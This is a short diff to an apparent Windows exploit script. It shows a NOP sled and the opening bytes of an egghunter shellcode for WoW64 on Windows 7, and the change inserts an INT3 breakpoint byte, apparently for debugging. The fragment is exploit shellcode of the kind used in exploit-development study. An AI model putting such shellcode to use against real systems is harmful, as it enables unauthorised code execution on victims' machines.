@@ -13,6 +13,7 @@ nops = "\x90"*100
 
 #modern egghunter for wow64 - Windows 7
 eggh = (
+"\xCC"  # Int 3
 "\x31\xdb"                            # XOR EBX, EBX
 "\x53"                                # PUSH EBX
 "\x53"                                # PUSH EBX
